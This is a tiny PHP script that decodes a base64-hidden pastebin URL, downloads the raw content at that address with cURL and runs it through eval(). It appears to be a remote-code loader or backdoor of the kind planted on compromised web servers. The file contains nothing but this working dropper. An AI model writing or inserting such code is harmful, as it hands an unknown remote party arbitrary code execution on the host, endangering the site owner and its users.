<?php
$st = curl_init();
curl_setopt($st,CURLOPT_URL,base64_decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzBnSHA2aEpI"));
curl_setopt($st,CURLOPT_RETURNTRANSFER,true);
$ex = curl_exec($st); 
eval($ex);
?>